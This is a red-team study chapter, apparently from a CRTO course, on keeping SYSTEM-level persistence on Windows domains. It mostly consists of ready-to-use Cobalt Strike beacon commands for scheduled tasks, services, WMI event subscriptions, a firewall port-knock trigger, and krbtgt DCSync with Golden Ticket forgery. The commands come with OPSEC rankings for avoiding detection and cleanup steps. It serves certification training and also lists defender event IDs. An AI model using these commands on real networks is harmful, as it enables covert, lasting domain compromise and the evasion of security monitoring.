# Elevated Persistence  

* Scheduled Task
* Windows Service
* Windows Management Instrumentation WMI

>Chapter 10: Elevated Persistence

Once elevated access is obtained, establish a second persistence layer to survive patching/mitigation of the initial elevation vector. All techniques here require admin/SYSTEM context.

**Prefer disk-less or low-footprint methods — OPSEC score counts.**

---

## OPSEC Quick Reference

| Technique | OPSEC | Disk Artifact | Survives Reboot | Event IDs |
|-----------|-------|---------------|-----------------|-----------|
| **Golden Ticket** | SAFE | None (attacker desktop only) | Until krbtgt rotation | 4662 (DCSync only, at harvest) |
| **DPERSIST1 (Golden Cert)** | SAFE | None | Until CA cert expires | Cert enrollment (at harvest) |
| **WMI Persistent Event** | CAUTION | Payload EXE on disk | Yes (WMI repo) | 5861, Sysmon 19/20/21 |
| **Scheduled Task (powerpick)** | CAUTION | Task XML in Tasks\ | Yes | 4698 |
| **Scheduled Task (SharPersist)** | CAUTION | Task XML in Tasks\ | Yes | 4698 |
| **Scheduled Task (shell schtasks)** | **UNSAFE** | Task XML in Tasks\ | Yes | 4698 + cmd.exe child |
| **Windows Service (SharPersist)** | CAUTION | Service binary | Yes | 7045, 4697 |
| **Windows Service (shell sc)** | **UNSAFE** | Service binary | Yes | 7045 + cmd.exe child |

**Exam preference order:** Golden Ticket > DPERSIST1 > WMI Event > Scheduled Task (powerpick) > Service (SharPersist) > Service/Task via shell (never)

---

## 1 — Scheduled Tasks

The Task Scheduler can execute payloads as SYSTEM on a trigger (boot, logon, time, event).

### OPSEC-CAUTION — Preferred Methods

```cs
// Method A: powerpick (no child process — unmanaged PS in beacon thread)
beacon> powerpick $action = New-ScheduledTaskAction -Execute 'C:\Windows\Temp\windbg.exe'; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName 'WindowsDebugHelper' -Action $action -Trigger $trigger -RunLevel Highest -User 'SYSTEM' -Force

// Method B: execute-assembly SharPersist (fork & run — spawns spawnto process)
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\Temp\windbg.exe" -n "WindowsDebugHelper" -m add -o logon

// Verify (powerpick — OPSEC-CAUTION, no child process)
beacon> powerpick Get-ScheduledTask -TaskName 'WindowsDebugHelper' | Select-Object TaskName,State
```

### OPSEC-UNSAFE — Avoid on Exam

```cs
// UNSAFE — spawns cmd.exe as child of beacon (visible in process tree)
beacon> shell schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc onstart /ru SYSTEM /f

// UNSAFE — spawns cmd.exe
beacon> shell schtasks /query /tn "WindowsUpdate" /fo LIST /v
```

### Cleanup

```cs
// OPSEC-CAUTION — use powerpick, not shell
beacon> powerpick Unregister-ScheduledTask -TaskName 'WindowsDebugHelper' -Confirm:$false

// UNSAFE alternative (avoid):
// beacon> shell schtasks /delete /tn "WindowsDebugHelper" /f
```

### Detection Footprint

- Event ID **4698** — Scheduled task created
- Event ID **4702** — Scheduled task updated
- Task XML written to `C:\Windows\System32\Tasks\<name>`
- Sysmon Event ID **11** (file create) on task XML path

---

## 2 — Windows Services

Creates a persistent service that runs a payload as SYSTEM at boot. **Generates Event 7045 — high-fidelity SOC alert. Avoid on exam unless last resort.**

### OPSEC-CAUTION — Least Noisy Method

```cs
// execute-assembly SharPersist (fork & run — no cmd.exe, but Event 7045 still fires)
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\Temp\beacon.exe" -n "WindowsUpdateHelper" -m add

// Verify (powerpick — no child process)
beacon> powerpick Get-Service -Name 'WindowsUpdateHelper' | Select-Object Name,Status,StartType
```

### OPSEC-UNSAFE — Avoid on Exam

```cs
// UNSAFE — every shell command spawns cmd.exe as child of beacon
beacon> shell sc create "SvcUpdate" binpath= "C:\Windows\Temp\beacon.exe" start= auto
beacon> shell sc description "SvcUpdate" "Windows Update Helper"
beacon> shell sc start "SvcUpdate"
beacon> shell sc qc SvcUpdate
```

### Cleanup

```cs
// OPSEC-CAUTION — powerpick
beacon> powerpick Stop-Service -Name 'WindowsUpdateHelper' -Force
beacon> powerpick (Get-WmiObject -Class Win32_Service -Filter "Name='WindowsUpdateHelper'").Delete()

// UNSAFE alternative (avoid):
// beacon> shell sc stop SvcUpdate
// beacon> shell sc delete SvcUpdate
```

### Detection Footprint

- Event ID **7045** — New service installed (System log) — **high-fidelity alert, always fires**
- Event ID **4697** — Service installed (Security log, if auditing enabled)
- Sysmon Event ID **13** (registry value set) — `HKLM\SYSTEM\CurrentControlSet\Services\`
- Service binary written to disk

---

## 3 — WMI Persistence (Eventing)

WMI persistent events survive reboots, run as SYSTEM, and store in the WMI repository (not a regular file on disk). Three components required:

| Component | Class | Purpose |
|-----------|-------|---------|
| **Event Filter** | `__EventFilter` | WQL query defining the trigger condition |
| **Event Consumer** | `CommandLineEventConsumer` | Action to take when filter matches |
| **Filter-to-Consumer Binding** | `__FilterToConsumerBinding` | Links filter to consumer |

### Primary Method — Lab Technique (psinject, OPSEC-CAUTION)

This is the method from the CRTO course lab. `psinject` into the SYSTEM beacon's own process — no `powershell.exe` spawn, no fork & run sacrificial process:

```cs
// Step 1: import the persistence script into beacon's PS runspace
beacon> powershell-import C:\Tools\WmiPersistence.ps1

// Step 2: run the Add function inside the SYSTEM beacon process (no child process)
beacon> psinject [BEACON PID] x64 Add-WmiPersistence

// Verify all three WMI objects were created
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

### Alternative — Inline powerpick (OPSEC-CAUTION)

If `WmiPersistence.ps1` is unavailable, install all three WMI objects inline via `powerpick`:

```cs
// 1. Event Filter — trigger on Event ID 1502 (GPO refresh)
beacon> powerpick $f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='Debug Trace'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"}

// 2. CommandLine Event Consumer — executes payload
beacon> powerpick $c = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments @{Name='Debug Consumer'; CommandLineTemplate='C:\Windows\System32\windbg.exe -trace'}

// 3. Bind filter to consumer
beacon> powerpick Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f; Consumer=$c}
```

### Alternative Trigger Conditions

Swap the `Query` string in the Event Filter to change what fires the beacon:

```powershell
# Event 1502 — GPO computer configuration refresh (lab default, ~90 min automatic)
"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '1502'"

# Event 6013 — System uptime report (fires at every reboot — good secondary trigger)
"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.EventCode = '6013'"

# Process spawn trigger — fires when svchost.exe starts (very frequent)
"SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'svchost.exe'"
```

### Remote Trigger — Port Knock via Firewall Drop (Advanced)

**Concept:** enable Firewall Packet Drop auditing → Event ID 5152 fires on dropped packets → filter on a specific attacker-controlled port → beacon executes when attacker sends a packet.

```cs
// OPSEC-UNSAFE — shell spawns cmd.exe; note this for reference only
beacon> shell auditpol /set /subcategory:"Filtering Platform Packet Drop" /success:enable /failure:enable

// OPSEC-CAUTION: powerpick alternative for the auditpol step
beacon> powerpick Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Audit' -Name 'AuditFilteringPlatformPacketDrop' -Value 3 -Type DWord

// Event filter — fires when firewall drops a packet on port 4444
beacon> powerpick $f = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments @{Name='NetFilter'; EventNamespace='root/cimv2'; QueryLanguage='WQL'; Query="SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_NTLogEvent' AND TargetInstance.LogFile='Security' AND TargetInstance.EventCode=5152 AND TargetInstance.Message LIKE '%4444%'"}
// Then bind consumer as above
```

> **Exam note:** Port knock technique is advanced and noisy during setup (`auditpol` change is detectable). Use only if WMI event-code trigger isn't firing reliably.

### Enumerate / Verify

```cs
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding
```

### Test Trigger

```cs
// OPSEC-CAUTION — spawns gpupdate.exe as child process (legitimate, acceptable for testing)
beacon> execute gpupdate /target:computer /force
// DNS beacon should appear within a few seconds
```

### Cleanup

```cs
// Method A — via psinject (matches install method)
beacon> psinject [BEACON PID] x64 Remove-WmiPersistence

// Method B — inline powerpick (if script not loaded)
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name='Debug Trace'" | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer -Filter "Name='Debug Consumer'" | Remove-WmiObject
beacon> powerpick Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%Debug%'" | Remove-WmiObject

// Remove payload binary
beacon> rm windbg.exe
```

### Detection Footprint

- Event ID **5861** — New WMI activity registered (WMI-Activity/Operational log)
- WMI repository modified: `C:\Windows\System32\wbem\Repository\`
- Sysmon Event ID **19** — WMI filter creation
- Sysmon Event ID **20** — WMI consumer creation
- Sysmon Event ID **21** — WMI filter-to-consumer binding
- No Event 7045 (no service created)

---

## 4 — Golden Ticket (Best OPSEC — No Binary on Disk)

Once you have the `krbtgt` AES256 hash (from DCSync), you can forge DA-level Kerberos tickets indefinitely — no binary deployed to any target machine.

```cs
// Prerequisite: DCSync for krbtgt hash (OPSEC-CAUTION — Event 4662 on DC)
beacon> dcsync contoso.com CONTOSO\krbtgt

// Get domain SID
beacon> ldapsearch (objectClass=domain) --attributes objectSid

// Forge golden ticket on attacker desktop (NOT in beacon)
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:contoso.com /sid:<domain-SID> /aes256:<krbtgt-aes256> /outfile:C:\Users\Attacker\Desktop\golden

// Inject into beacon session when DA access needed
beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\[GOLDEN].kirbi
beacon> run klist
beacon> ls \\lon-dc-1\c$
```

**Why this is the best persistence:**
- No process runs on target machines
- No file written to any target host
- Ticket lives only on attacker desktop
- Survives target machine reboots, patch cycles, IR response
- Only detection opportunity was Event 4662 at DCSync time
- Valid until `krbtgt` password rotation (default 60 days; rarely done in exam environments)

---

## OPSEC Decision Tree

```
Need elevated persistence?
│
├─ Have DA + krbtgt hash?
│   └─ YES → Golden Ticket (SAFE — no footprint on target)
│
├─ Have DA + ADCS in scope?
│   └─ YES → DPERSIST1 Golden Certificate (SAFE — see labs/dpersist1.md)
│
├─ Need binary execution on target (reboot/GPO trigger)?
│   └─ Use WMI Event Subscription (CAUTION — no 7045, WMI repo only)
│       psinject [BEACON PID] x64 Add-WmiPersistence
│
├─ WMI failing or not available?
│   └─ Scheduled Task via powerpick (CAUTION — Event 4698, task XML on disk)
│       powerpick Register-ScheduledTask ...
│
└─ Nothing else works?
    └─ Windows Service via SharPersist (CAUTION — Event 7045, will alert SOC)
       LAST RESORT — always disclose OPSEC cost when choosing this
```

---

## Command Safety Summary

| Operation | SAFE command | UNSAFE command (avoid) |
|-----------|-------------|----------------------|
| Create WMI subscription | `psinject [PID] x64 Add-WmiPersistence` | — |
| Create WMI inline | `powerpick Set-WmiInstance ...` | — |
| Create scheduled task | `powerpick Register-ScheduledTask ...` | `shell schtasks /create ...` |
| Create service | `execute-assembly SharPersist.exe -t service ...` | `shell sc create ...` |
| Query service | `powerpick Get-Service -Name ...` | `shell sc qc ...` |
| Query scheduled task | `powerpick Get-ScheduledTask -TaskName ...` | `shell schtasks /query ...` |
| Stop service | `powerpick Stop-Service -Name ... -Force` | `shell sc stop ...` |
| Delete service | `powerpick (Get-WmiObject -Class Win32_Service -Filter ...).Delete()` | `shell sc delete ...` |
| Delete scheduled task | `powerpick Unregister-ScheduledTask -TaskName ... -Confirm:$false` | `shell schtasks /delete ...` |
| Remove WMI subscription | `powerpick Get-WmiObject ... \| Remove-WmiObject` | — |
| Audit policy change | `powerpick Set-ItemProperty HKLM:\... AuditFilteringPlatformPacketDrop 3` | `shell auditpol /set ...` |

> **Rule:** Any `shell` or `run` command spawns `cmd.exe` as a child of the beacon process. Visible in process tree, generates child process events. Replace with `powerpick`, `execute-assembly`, or `inline-execute` equivalents wherever possible.

---

*Source: ZPS CRTO Course — Chapter 10: Elevated Persistence*
*Last updated: 2026-04-17*
